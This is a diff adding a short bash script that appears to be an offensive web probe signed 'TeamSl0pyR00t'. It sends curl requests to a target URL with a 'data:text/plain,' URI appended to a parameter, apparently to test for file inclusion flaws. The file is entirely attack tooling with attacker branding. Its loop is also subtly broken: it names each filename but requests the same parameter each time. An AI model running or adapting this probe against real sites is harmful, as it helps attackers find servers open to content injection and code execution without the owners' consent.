@@ -1,0 +1,18 @@
+#!/bin/bash
+red='\e[31m'
+green='\e[32m'
+yellow='\e[33m'
+white='\e[97m'
+
+url="$1"
+sp="$2"
+srp="data:text/plain,TeamSl0pyR00t-Says-helloworld"
+for filename in ${sp[@]};do
+  echo
+  echo -e " $green{ $red sl0ppy $green} $white----$yellow $filename $white----$green{ $red sl0ppy $green}"$white
+  curl $url/$sp$srp
+  echo
+  echo -e " $green{ $red sl0ppy $green} $white------$red Sl0ppyr00t $white----------$green{ $red sl0ppy $green}"
+done
+
+
